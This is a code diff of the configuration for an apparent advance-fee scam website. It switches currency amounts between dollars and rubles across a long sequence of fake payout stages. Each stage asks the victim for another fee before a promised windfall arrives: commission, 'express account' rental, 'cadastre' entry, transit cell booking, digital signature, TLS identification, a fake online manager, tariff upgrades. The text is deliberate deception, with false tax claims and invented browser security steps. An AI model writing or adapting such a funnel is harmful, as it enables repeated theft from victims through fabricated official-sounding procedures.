-                description: ['The first part of the transfer amounting to <b class="text-numbers">{{firstPart}}</b> has been marked as paid', "The first transfer cannot be sent until the fee for the second transfer is paid!", "As soon as you pay the fee for the second transfer, both transfers will be <b>sent</b> to the details you specified"],
-                product: 'Since the payment is divided into two equal parts, the second transfer will be <span class="text-numbers font-weight-bold">{{secondPart}}</span>, the fee for it is <span class="text-numbers">(0.1% + $0.68)</span>, i.e.',
+                statusMessage: "The first part of the amount has been successfully credited to the express account!",
+                title: "Payment system requests commission for the second transfer",
+                description: ['The first part of the transfer of <b class="text-numbers">{{firstPart}}</b> is marked as paid', "The first transfer cannot be sent until the commission for the second transfer is paid!", "As soon as you pay the commission for the second transfer, both transfers will be <b>sent</b> to the details you specified"],
+                product: 'Since the payout is divided into two equal parts, the second transfer will be <span class="text-numbers font-weight-bold">{{secondPart}}</span>, its commission <span class="text-numbers">(0.1% + 50 rub.)</span>, i.e.',
                 amount: {
-                    e: 31.76, // 2350 / 74 ≈ 31.76
-                    c: 31.76,
-                    b: 31.76,
-                    p: 31.76,
-                    h: 31.76
+                    e: 2350,
+                    c: 2350,
+                    b: 2350,
+                    p: 2350,
+                    h: 2350
                 },
                 customItem: "",
-                instructions: ["We guarantee a fast transfer", "Pay the fee for the second transfer", "Receive your full payment"],
-                buttonText: "Pay the fee for the second transfer",
+                instructions: ["We guarantee a fast transfer", "Pay the commission for the second transfer", "Receive your full payout"],
+                buttonText: "Pay commission for the second transfer",
                 paymentLink: "/account/comissionsp?s=gd260ca58",
                 paymentLinks: {
                     e: window.location.origin + o + "pay48546.html",
@@ -5448,23 +5556,23 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ["Hello, How are you?", "I have an offer for you {{upsellbtn}}", "adasdsad", "adasdasdasdasd"]
+                    chatPull: ["Hello, how are you?", "I have an offer for you {{upsellbtn}}", "adasdsad", "adasdasdasdasd"]
                 },
                 loadsteps: ["Transferring the second part of the amount to the express account", "Checking payment status"],
-                statusMessage: "Both parts of the payment successfully credited to the express account!",
+                statusMessage: "Both parts of the payout have been successfully credited to the express account!",
                 title: "Use the express account to avoid paying personal income tax",
-                description: ['General provisions: Registration of internet income with the tax authority obliges the recipient (you) to pay personal income tax (PIT) in the amount of 20% of the total profit. However, if the profit does not exceed <span class="text-numbers">{{geoMoney10Percent}}</span>, the citizen is exempt from paying tax. To send you a transfer of <span class="text-numbers">{{moneyPageBased}}</span> and not pay personal income tax, you need to receive the funds as an express transfer. In this case, no tax is levied on them. This is provided by law and will allow you to save a significant part of the money.', "To use this service, you need to pay for the <b>rental</b> of a reliable express account."],
-                product: "After renting the express account, the funds will be transferred to the previously specified details. The cost of renting an express account for 1 day is",
+                description: ['General provisions: Registration of Internet income with the tax authority obliges the recipient (you) to pay personal income tax (PIT) in the amount of 20% of the total profit. At the same time, if the profit does not exceed <span class="text-numbers">{{geoMoney10Percent}}</span>, the citizen is exempt from paying tax. To send you a transfer of <span class="text-numbers">{{moneyPageBased}}</span> and not pay personal income tax, it is necessary that you receive the funds as an express transfer. In this case, tax is not charged on them. This is provided by law and will allow you to save a significant part of the money.', "To use this service, you need to pay for the <b>rental</b> of a reliable express account."],
+                product: "After renting the express account, the funds will be transferred to the previously specified details. The cost of renting the express account for 1 day is",
                 amount: {
-                    e: 38.92, // 2880 / 74 ≈ 38.92
-                    c: 38.92,
-                    b: 38.92,
-                    p: 38.92,
-                    h: 38.92
+                    e: 2880,
+                    c: 2880,
+                    b: 2880,
+                    p: 2880,
+                    h: 2880
                 },
                 customItem: "",
-                instructions: ["Pay for the express account rental", "The withdrawal will be made instantly", "Receive your funds"],
-                buttonText: "Pay for rental",
+                instructions: ["Pay for the express account rental", "Withdrawal will be made instantly", "Receive your funds"],
+                buttonText: "Pay rent",
                 paymentLink: "/account/express?s=gd260ca58",
                 paymentLinks: {
                     e: window.location.origin + o + "pay48547.html",
@@ -5478,21 +5586,21 @@
                 name: "Cadastre of gratuitous rewards",
                 loadtime: 16,
                 isLoading: !0,
-                loadsteps: ["Express account successfully activated", "Verifying the transfer with the supervisory authority"],
+                loadsteps: ["Express account successfully activated", "Checking transfer in supervisory authority"],
                 statusMessage: "Express account successfully activated",
-                title: "The transfer is awaiting entry into the cadastre of gratuitous rewards",
-                description: ["To receive the funds right now and not report the receipt to the <b>supervisory authority</b>, it is necessary to enter the transfer into the cadastre of gratuitous rewards. This procedure is mandatory to receive the full payment amount.", 'Immediately after the transfer is entered into the cadastre, the transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be reserved in a transit cell and sent to the specified details within <b>10 minutes</b>!'],
+                title: "Transfer awaits entry into the cadastre of gratuitous rewards",
+                description: ["To receive the funds right now and not report the receipt to the <b>supervisory authority</b>, it is necessary to enter the transfer into the cadastre of gratuitous rewards. This procedure is mandatory to receive the full payout amount.", 'Immediately after entering the transfer into the cadastre, the transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be reserved in the transit cell and sent to the specified details within <b>10 minutes</b>!'],
                 upsellType: "text",
-                product: "The cost of entry into the cadastre is only",
+                product: "The cost of entering into the cadastre is only",
                 amount: {
-                    e: 30.54, // 2260 / 74 ≈ 30.54
-                    c: 30.54,
-                    b: 30.54,
-                    p: 30.54,
-                    h: 30.54
+                    e: 2260,
+                    c: 2260,
+                    b: 2260,
+                    p: 2260,
+                    h: 2260
                 },
                 customItem: "",
-                instructions: ["Pay for the entry into the cadastre", "The money will be sent to the previously specified account instantly"],
+                instructions: ["Pay for the entry into the cadastre", "The money will be credited to the previously specified account instantly"],
                 buttonText: "Enter into cadastre",
                 paymentLink: "/account/cadastr?s=gd260ca58",
                 paymentLinks: {
@@ -5504,21 +5612,21 @@
                 }
             },
             transitbooking: {
-                name: "Transit express cell booking",
+                name: "Booking of transit express cell",
                 loadtime: 8,
                 isLoading: !0,
-                loadsteps: ["Entering into the cadastre of gratuitous rewards", "Transferring funds"],
+                loadsteps: ["Entry into cadastre of gratuitous rewards", "Transfer of funds"],
                 statusMessage: "You have been successfully entered into the cadastre of gratuitous rewards!",
-                title: "The transfer is awaiting booking of the transit express cell",
-                description: ['Transfer of funds <span class="text-numbers">{{moneyPageBased}}</span> booked for 10 minutes!', "To receive the funds at the booked time, you need to pay for the booking of the <b>transit express cell</b>", 'After payment for the booking, the transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be sent to you at the booked time!'],
+                title: "Transfer awaits booking of transit express cell",
+                description: ['Transfer of <span class="text-numbers">{{moneyPageBased}}</span> has been booked. In 10 minutes!', "To receive the funds at the booked time, you need to pay for the booking of the <b>transit express cell</b>", 'After paying for the booking, the transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be sent to you at the booked time!'],
                 upsellType: "text",
-                product: "The cost of booking is only",
+                product: "Booking cost is only",
                 amount: {
-                    e: 33.51, // 2480 / 74 ≈ 33.51
-                    c: 33.51,
-                    b: 33.51,
-                    p: 33.51,
-                    h: 33.51
+                    e: 2480,
+                    c: 2480,
+                    b: 2480,
+                    p: 2480,
+                    h: 2480
                 },
                 customItem: "",
                 instructions: ["Pay for the booking", "Receive the funds to the specified details"],
@@ -5533,24 +5641,24 @@
                 }
             },
             transitactivation: {
-                name: "Transit express cell activation",
+                name: "Activation of transit express cell",
                 loadtime: 15,
                 isLoading: !0,
-                loadsteps: ["Transferring funds", "Connecting to activate the transit express cell"],
+                loadsteps: ["Transfer of funds", "Connection for activation of transit express cell"],
                 statusMessage: "Transit express cell successfully booked!",
-                title: "The transfer is awaiting activation of the transit express cell",
-                description: ['Booking of transfer <span class="text-numbers">{{moneyPageBased}}</span> for today has been successfully paid!', "To receive the funds at the booked time, you need to <b>activate</b> the paid booking of the transit cell. ", 'To activate the paid booking and receive the transfer of <span class="text-numbers">{{moneyPageBased}}</span>, make an activation payment.', 'This payment will be credited to the transit cell and will be available for withdrawal together with the remaining amount. The total amount to be received after the activation payment will be <span class="text-numbers">{{moneyPageBased}}</span> and will be sent to you at the previously booked time!'],
+                title: "Transfer awaits activation of transit express cell",
+                description: ['Booking of transfer <span class="text-numbers">{{moneyPageBased}}</span> for today has been successfully paid!', "To receive the funds at the booked time, you need to <b>activate</b> the paid booking of the transit cell.", 'To activate the paid booking and receive the transfer of <span class="text-numbers">{{moneyPageBased}}</span>, make an activation payment.', 'This payment will be credited to the transit cell and available for withdrawal together with the rest of the amount. The total amount after the activation payment will be <span class="text-numbers">{{moneyPageBased}}</span> and will be sent to you at the previously booked time!'],
                 upsellType: "text",
-                product: "The cost of activating the transit express cell is only",
+                product: "Activation cost of transit express cell is only",
                 amount: {
-                    e: 40.27, // 2980 / 74 ≈ 40.27
-                    c: 40.27,
-                    b: 40.27,
-                    p: 40.27,
-                    h: 40.27
+                    e: 2980,
+                    c: 2980,
+                    b: 2980,
+                    p: 2980,
+                    h: 2980
                 },
                 customItem: "",
-                instructions: ["Pay for the activation of the transit cell", "The system will automatically activate the cell", "Your payment will be sent to your details"],
+                instructions: ["Pay for the activation of the transit cell", "The system will automatically activate the cell", "Your payout will be sent to your details"],
                 buttonText: "Activate",
                 paymentLink: "/account/transitactivation?s=gd260ca58",
                 paymentLinks: {
@@ -5565,21 +5673,21 @@
                 name: "Digital signature generation",
                 loadtime: 8,
                 isLoading: !0,
-                loadsteps: ["Transferring funds", "Connecting to digital signature"],
+                loadsteps: ["Transfer of funds", "Connection to digital signature"],
                 statusMessage: "Transit express cell successfully activated!",
                 title: "You need to create a digital signature",
-                description: ['The transfer of funds <span class="text-numbers">{{moneyPageBased}}</span> is booked for sending today (in 2 min). Your transfer has left the transit cell and has been placed in the cache of the TLS protocol of your browser! This means that the transfer will be made at the above time if you put a personal digital signature on receiving funds from the browser into the TLS protocol right now.', "Most likely, as an ordinary Internet user, you do not have a personal digital signature. We have made sure that you do not have to look for organizations that could generate it for you. ", "Therefore, we are ready to provide you with the service of generating a personal digital signature for receiving funds from the browser via the TLS protocol.", 'Immediately after you receive a personal digital signature in the form of a three-digit cipher of letters and numbers, it will be confirmed by you in the browser, and the transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be credited to the previously specified details!'],
+                description: ['Transfer of <span class="text-numbers">{{moneyPageBased}}</span> is booked for sending today (in 2 min). Your transfer has left the transit cell and has been placed in the TLS protocol cache of your browser! This means that the transfer will be made at the above time if you put your personal digital signature on receiving funds from the browser into the TLS protocol right now.', "Most likely, as an ordinary Internet user, you do not have a personal digital signature. We have taken care that you do not have to look for organizations that could generate it for you.", "Therefore, we are ready to provide you with the service of generating a personal digital signature for receiving funds from the browser via the TLS protocol.", 'Immediately after you receive your personal digital signature in the form of a three-digit cipher of letters and numbers, it will be confirmed by you in the browser, and the transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be credited to the previously specified details!'],
                 upsellType: "text",
-                product: "The cost of digital signature generation services is only",
+                product: "Cost of digital signature generation services is only",
                 amount: {
-                    e: 34.05, // 2520 / 74 ≈ 34.05
-                    c: 34.05,
-                    b: 34.05,
-                    p: 34.05,
-                    h: 34.05
+                    e: 2520,
+                    c: 2520,
+                    b: 2520,
+                    p: 2520,
+                    h: 2520
                 },
                 customItem: "",
-                instructions: ["Pay for the signature generation services", "The system will automatically withdraw your payment using the signature", "Receive your payment"],
+                instructions: ["Pay for the signature generation services", "With the signature, the system will automatically withdraw your payment", "Receive your payout"],
                 buttonText: "Pay for services",
                 paymentLink: "/account/signature?s=gd260ca58",
                 paymentLinks: {
@@ -5591,25 +5699,25 @@
                 }
             },
             signatureverify: {
-                name: "Digital signature verification",
+                name: "Digital signature confirmation",
                 loadtime: 20,
                 isLoading: !0,
-                loadsteps: ["Transferring funds", "Generating and verifying digital signature"],
+                loadsteps: ["Transfer of funds", "Generation and confirmation of digital signature"],
                 statusMessage: "Digital signature successfully created!",
-                title: "Digital signature verification required",
-                description: ['Your personal digital signature has been created and is ready to use! The cipher of the personal digital signature is <b class="text-numbers">RDL_356279</b>. You need to verify the personal digital signature to receive the transfer of <span class="text-numbers">{{moneyPageBased}}</span> booked for sending today.', "The verification of the digital signature must be notarized, we have made sure that it is convenient for you to verify the digital signature directly on the site.", 'Verify the personal digital signature to receive <span class="text-numbers">{{moneyPageBased}}</span>', 'Immediately after replenishing the transfer amount, a money transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be sent to you in full to the specified details.'],
+                title: "Digital signature confirmation required",
+                description: ['Your personal digital signature has been generated and is ready for use! The cipher of the personal digital signature is <b class="text-numbers">RDL_356279</b>. You now need to confirm the personal digital signature to receive the transfer of <span class="text-numbers">{{moneyPageBased}}</span> booked for sending today.', "Confirmation of the digital signature must be notarized, we have taken care that you can conveniently confirm the digital signature directly on the site.", 'Confirm your personal digital signature to receive <span class="text-numbers">{{moneyPageBased}}</span>', 'Immediately after you top up the transfer amount, a money transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be sent to your specified details in full!'],
                 upsellType: "text",
-                product: "Replenish the transfer amount by",
+                product: "Top up the transfer amount by",
                 amount: {
-                    e: 35.68, // 2640 / 74 ≈ 35.68
-                    c: 35.68,
-                    b: 35.68,
-                    p: 35.68,
-                    h: 35.68
+                    e: 2640,
+                    c: 2640,
+                    b: 2640,
+                    p: 2640,
+                    h: 2640
                 },
                 customItem: "",
-                instructions: ["Replenish your balance by the specified amount", "The system will automatically verify your signature", "Your payment will be sent to your details"],
-                buttonText: "Replenish balance",
+                instructions: ["Top up your balance by the specified amount", "The system will automatically verify your signature", "Your payout will be sent to your details"],
+                buttonText: "Top up balance",
                 paymentLink: "/account/signatureverify?s=gd260ca58",
                 paymentLinks: {
                     e: window.location.origin + o + "pay48552.html",
@@ -5623,22 +5731,22 @@
                 name: "TLS protocol identification",
                 loadtime: 14,
                 isLoading: !0,
-                loadsteps: ["Identifying TLS protocol in the browser", "Verifying digital signature"],
-                statusMessage: "Digital signature successfully verified!",
-                title: "The transfer is awaiting TLS protocol identification",
-                description: ['Your personal digital signature has been verified! You can use it on any online services. Your browser has requested identification of the TLS protocol for instant receipt of the transfer of <span class="text-numbers">{{moneyPageBased}}</span> directly from the browser. This may be due to the fact that you have two or more tabs open in your browser. The developer of your browser asks to confirm that the transfer of <span class="text-numbers">{{moneyPageBased}}</span> is being received by you, and not by attackers who have hacked the browser.', "To confirm the details, you need to identify the TLS protocol by replenishing the transfer amount.", 'Immediately after replenishing the transfer amount, the payment of <span class="text-numbers">{{moneyPageBased}}</span> will be identified and sent to the specified details within 10 minutes!'],
+                loadsteps: ["TLS protocol identification in browser", "Digital signature confirmation"],
+                statusMessage: "Digital signature successfully confirmed!",
+                title: "Transfer awaits TLS protocol identification",
+                description: ['Your personal digital signature is confirmed! You can use it on any online services. Your browser has requested TLS protocol identification for instant receipt of the transfer of <span class="text-numbers">{{moneyPageBased}}</span> directly from the browser. Most likely, this is because you have two or more tabs open in your browser. Your browser developer asks you to confirm that you are the one receiving the transfer of <span class="text-numbers">{{moneyPageBased}}</span>, not hackers who have hacked the browser.', "To confirm the details, you need to identify the TLS protocol by topping up the transfer amount.", 'Immediately after you top up the transfer amount, the payout of <span class="text-numbers">{{moneyPageBased}}</span> will be identified and sent to the specified details within 10 minutes!'],
                 upsellType: "text",
-                product: "Replenish the transfer amount by",
+                product: "Top up the transfer amount by",
                 amount: {
-                    e: 40.54, // 3000 / 74 ≈ 40.54
-                    c: 40.54,
-                    b: 40.54,
-                    p: 40.54,
-                    h: 40.54
+                    e: 3000,
+                    c: 3000,
+                    b: 3000,
+                    p: 3000,
+                    h: 3000
                 },
                 customItem: "",
-                instructions: ["Replenish your balance by the specified amount", "The system will automatically identify the TLS protocol in your browser", "Receive your payment"],
-                buttonText: "Replenish balance",
+                instructions: ["Top up your balance by the specified amount", "The system will automatically identify the TLS protocol in your browser", "Receive your payout"],
+                buttonText: "Top up balance",
                 paymentLink: "/account/tls?s=gd260ca58",
                 paymentLinks: {
                     e: window.location.origin + o + "pay48553.html",
@@ -5652,21 +5760,21 @@
                 name: "Personal manager services",
                 loadtime: 10,
                 isLoading: !0,
-                loadsteps: ["Automatic withdrawal in progress", "Identifying TLS protocol in the browser"],
+                loadsteps: ["Automatic withdrawal in progress", "TLS protocol identification in browser"],
                 statusMessage: "TLS protocol successfully identified!",
-                title: "Automatic transfer sending refused",
-                description: ['<h4 style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><br><b>Transfer status:</b><br><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:20px;padding-top:10px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Awaiting manual sending!</h3> </strong> </span> </h4>', "Automatic money transfer is not supported by the payment system. Manual sending of the money transfer to the specified account is required.", '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="Manager is online now!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p style="font-size:25px;line-height:1.1">Polina Solovieva - <b>Manager</b></p><p style="font-size:25px;line-height:1.1">Experience: <b>3 years</b></p><p style="font-size:25px;line-height:1.1">Status: <b style="color:#80BB25">Online</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">To have your money sent manually, hire a personal manager. The manager will independently send you money from your account balance. </span></span></p><br><br></div>'), 'Immediately after paying for the manager\'s services, a money transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be sent.'],
-                product: "The cost of the personal manager service is only",
+                title: "Automatic transfer sending denied",
+                description: ['<h4 style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><br><b>Transfer status:</b><br><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:20px;padding-top:10px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Awaiting manual sending!</h3> </strong> </span> </h4>', "Automatic money transfer is not supported by the payment system. Manual sending of the money transfer to the specified account is required.", '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="The manager is currently online!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p style="font-size:25px;line-height:1.1">Polina Solovyova - <b>Manager</b></p><p style="font-size:25px;line-height:1.1">Work experience: <b>3 years</b></p><p style="font-size:25px;line-height:1.1">Status: <b style="color:#80BB25">Online</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">To have your money sent manually, hire a personal manager. The manager will manually send you the money from the balance of your account. </span></span></p><br><br></div>'), 'Immediately after paying for the manager\'s services, a money transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be sent'],
+                product: "Cost of personal manager service is only",
                 amount: {
-                    e: 60.81, // 4500 / 74 ≈ 60.81
-                    c: 60.81,
-                    b: 60.81,
-                    p: 60.81,
-                    h: 60.81
+                    e: 4500,
+                    c: 4500,
+                    b: 4500,
+                    p: 4500,
+                    h: 4500
                 },
                 customItem: "",
                 upsellType: "text",
-                instructions: ["Hire a personal manager by paying for their services", "The manager will contact you immediately after payment directly on our site", "You will receive your payment immediately in manual mode"],
+                instructions: ["Hire a personal manager by paying for their services", "The manager will contact you immediately after payment right on our site", "You will receive your payout immediately in manual mode"],
                 buttonText: "Hire manager",
                 paymentLink: "/account/manual?s=gd260ca58",
                 paymentLinks: {
@@ -5681,17 +5789,17 @@
                 name: "Maximum tariff",
                 loadtime: 32,
                 isLoading: !0,
-                loadsteps: ["Manual sending of funds in progress", "Establishing contact with the personal manager"],
+                loadsteps: ["Manual sending of funds in progress", "Establishing contact with personal manager"],
                 statusMessage: "You have successfully hired a personal manager!",
                 title: "Transfer amount limit exceeded",
-                description: ['<h4 class="mt-0" style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><b>Transfer status:</b><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:5px;padding-top:5px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Awaiting limit increase!</h3> </strong> </span> </h4>', "The money transfer has been rejected by the mass payment system. The transfer amount limit has been exceeded. To complete the transfer, increase your limit for monetary transactions.", '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="Manager is online now!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p class="mb-0" style="font-size:25px;line-height:1.1">Polina Solovieva - <b>Manager</b></p><p style="font-size:25px;line-height:1.1">Experience: <b>3 years</b></p><p style="font-size:25px;line-height:1.1">Status: <b style="color:#80BB25">Online</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">I have made a request to the mass payment system. You have the "Standard" tariff. Transfers there are no more than <b class="sMoney2">$405.41</b> per day. That\'s why the transfer did not go through immediately and is still being processed.<br><br>To complete the transfer and receive the money, increase the transfer amount limit by connecting the "Maximum" tariff. It costs only <b class="sMoney2"><span data-pay="price">{{upsellPrice}}</span> dollars</b>{{geoUpsellPrice}}. As soon as you connect it, they will send you the money immediately.</span></span></p></div>')],
-                product: 'The cost of connecting the "Maximum" tariff is only',
+                description: ['<h4 class="mt-0" style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><b>Transfer status:</b><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:5px;padding-top:5px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Awaiting limit increase!</h3> </strong> </span> </h4>', "The money transfer has been rejected by the mass payment system. The transfer amount limit has been exceeded. To complete the transfer, increase your limit for monetary transactions.", '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="The manager is currently online!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p class="mb-0" style="font-size:25px;line-height:1.1">Polina Solovyova - <b>Manager</b></p><p style="font-size:25px;line-height:1.1">Work experience: <b>3 years</b></p><p style="font-size:25px;line-height:1.1">Status: <b style="color:#80BB25">Online</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">I made a request to the mass payment system. You have the "Standard" tariff. Transfers there are no more than <b class="sMoney2">30,000 rubles</b> per day. That is why the transfer did not go through immediately, it is still being processed.<br><br>To complete the transfer and receive the money, increase the transfer amount limit by activating the "Maximum" tariff. It costs only <b class="sMoney2"><span data-pay="price">{{upsellPrice}}</span> rubles</b>{{geoUpsellPrice}}. As soon as you activate it, they will send you the money immediately.</span></span></p></div>')],
+                product: 'Cost of connecting the "Maximum" tariff is only',
                 amount: {
-                    e: 59.46, // 4400 / 74 ≈ 59.46
-                    c: 59.46,
-                    b: 59.46,
-                    p: 59.46,
-                    h: 59.46
+                    e: 4400,
+                    c: 4400,
+                    b: 4400,
+                    p: 4400,
+                    h: 4400
                 },
                 customItem: "",
                 upsellType: "text",
@@ -5710,17 +5818,17 @@
                 name: "Instant transfer",
                 loadtime: 20,
                 isLoading: !0,
-                loadsteps: ["Processing the money transfer request", "Establishing contact with the personal manager"],
-                statusMessage: "Transfer request successfully processed!",
-                title: "Awaiting transfer",
-                description: ['<h4 style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><br><b>Transfer status:</b><br><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:20px;padding-top:10px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Request processed</h3> </strong> </span> </h4>', 'The transfer request has been processed. Transfers exceeding <b><span class="text-numbers">{{geoMoneyHalfLimit}}</span></b> are received within 30 business days. Await the arrival of funds.', '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="Manager is online now!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p style="font-size:25px;line-height:1.1">Polina Solovieva - <b>Manager</b></p><p style="font-size:25px;line-height:1.1">Experience: <b>3 years</b></p><p style="font-size:25px;line-height:1.1">Status: <b style="color:#80BB25">Online</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">Of course, it\'s inconvenient to wait that long. But these are the conditions of the mass payment system we are connected to.<br><br>Usually our users don\'t wait, but connect the "Instant Transfer" service and receive money immediately. It costs <b class="sMoney2 text-numbers"><span>{{upsellPrice}}</span> dollars</b><span class="text-numbers">{{geoUpsellPrice}}</span>. If you also want to receive the transfer instantly, I recommend connecting this service and the money will be sent to you immediately.</span></span></p><br><br></div>')],
-                product: 'The cost of the "Instant Transfer" service is only',
+                loadsteps: ["Processing money transfer request", "Establishing contact with personal manager"],
+                statusMessage: "Transfer request successfully submitted!",
+                title: "Wait for transfer",
+                description: ['<h4 style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><br><b>Transfer status:</b><br><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:20px;padding-top:10px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Request submitted</h3> </strong> </span> </h4>', 'The transfer request has been submitted. Transfers exceeding <b><span class="text-numbers">{{geoMoneyHalfLimit}}</span></b> are received within 30 business days. Expect funds to arrive.', '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="The manager is currently online!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p style="font-size:25px;line-height:1.1">Polina Solovyova - <b>Manager</b></p><p style="font-size:25px;line-height:1.1">Work experience: <b>3 years</b></p><p style="font-size:25px;line-height:1.1">Status: <b style="color:#80BB25">Online</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">Of course, it is not convenient to wait that long. But these are the conditions of the mass payment system we are connected to.<br><br>Usually, our users do not wait, but activate the "Instant transfer" service and receive the money immediately. It costs <b class="sMoney2 text-numbers"><span>{{upsellPrice}}</span> rubles</b><span class="text-numbers">{{geoUpsellPrice}}</span>. If you also want to receive the transfer instantly, I recommend activating this service and you will receive the money immediately.</span></span></p><br><br></div>')],
+                product: 'Cost of "Instant transfer" service is only',
                 amount: {
-                    e: 80.81, // 5980 / 74 ≈ 80.81
-                    c: 80.81,
-                    b: 80.81,
-                    p: 80.81,
-                    h: 80.81
+                    e: 5980,
+                    c: 5980,
+                    b: 5980,
+                    p: 5980,
+                    h: 5980
                 },
                 customItem: "",
                 upsellType: "text",
@@ -5736,14 +5844,14 @@
                 }
             },
             fin: {
-                name: "Finish",
+                name: "Ending",
                 loadtime: 5,
                 isLoading: !0,
                 upsellType: "text",
-                loadsteps: ["Processing the money transfer request", "Transferring funds"],
+                loadsteps: ["Processing money transfer request", "Transfer of funds"],
                 statusMessage: "Transfer #34862363234 successfully sent!",
-                title: "Awaiting receipt of funds",
-                description: ["Funds will be credited to your account within 3 business days.", "You can speed up this process by writing to tech support."],
+                title: "Wait for funds to arrive",
+                description: ["The funds will be credited to your account within 3 business days.", "You can speed up this process by writing to technical support"],
                 product: 'You won "JOURNALIST MONEY"',
                 amount: {
                     e: 0,
@@ -5753,8 +5861,8 @@
                     h: 0
                 },
                 customItem: "",
-                instructions: ["Receive your gift", "Await receipt of funds"],
-                buttonText: "Receive gift",
